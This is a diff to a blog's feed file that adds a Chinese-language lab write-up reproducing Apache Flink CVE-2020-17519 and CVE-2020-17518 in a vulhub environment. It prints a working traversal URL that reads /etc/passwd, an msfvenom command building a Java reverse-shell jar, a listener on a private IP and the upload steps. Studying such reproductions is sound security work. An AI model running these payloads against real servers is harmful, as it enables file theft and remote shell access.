@@ -4,6 +4,29 @@
   
     
     <entry>
+      <title>Apache Flink任意文件上传/读取(CVE-2020-17518/17519)漏洞复现</title>
+      <link href="2022/01/21/Apache-Flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%AF%BB%E5%8F%96-CVE-2020-17518-17519-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+      <url>2022/01/21/Apache-Flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%AF%BB%E5%8F%96-CVE-2020-17518-17519-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+      
+        <content type="html"><![CDATA[<p>业精于勤而荒于嬉，行成于思而毁于随</p><hr><span id="more"></span><p>使用 <code>vulnhub</code> 搭建环境，直接 <code>docker-compose up -d</code> 启动环境</p><p>访问 <code>IP:8081</code> </p><p><img src="../../../../img/22-1-21/image-20220121115008093.png" alt="image-20220121115008093"></p><p>先复现个最简单的任意文件读取 (CVE-2020-17519)</p><p><strong>影响版本</strong> : <code>1.11.0</code>  <code>1.11.1</code>  <code>1.11.2</code></p><p>直接读取 <code>/etc/passwd</code> 文件</p><p>POC：</p><blockquote><p>/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</p></blockquote><p><img src="../../../../img/22-1-21/image-20220121115609580.png" alt="image-20220121115609580"></p><p>再复现任意文件上传(CVE-2020-17518)</p><p><strong>影响版本</strong> : <code>1.5.1 - 1.11.2</code></p><p>使用 <code>msfvenom</code> 生成 <code>java</code> 反弹 <code>shell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;shell_reverse_tcp LHOST&#x3D;IP LPORT&#x3D;端口 -f jar &gt; 生成的jar包</span><br></pre></td></tr></table></figure><p><img src="../../../../img/22-1-21/image-20220124160552644.png" alt="image-20220124160552644"></p><p>再创建一个监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler -p java&#x2F;shell_reverse_tcp -H 10.211.55.11 -P 2231</span><br></pre></td></tr></table></figure><p><img src="../../../../img/22-1-21/image-20220124160947183.png" alt="image-20220124160947183"></p><p>然后上传到网站，选择 <code>Submit New Job</code>  ，点击 <code>Add New</code> 上传 <code>jar</code> 包 ，然后选择上传的 <code>jar</code> 包，点击 <code>Submit</code></p><p><img src="../../../../img/22-1-21/image-20220121171743002.png" alt="image-20220121171743002"></p><p>这样就可以上线了，但是我没有在外网搭建msf，也不想做内网穿透，就不展示上线了</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Apache Flink </tag>
+            
+            <tag> CVE-2020-17518 </tag>
+            
+            <tag> CVE-2020-17519 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SSRF打内网redis</title>
       <link href="2022/01/19/SSRF%E6%89%93%E5%86%85%E7%BD%91redis/"/>
       <url>2022/01/19/SSRF%E6%89%93%E5%86%85%E7%BD%91redis/</url>
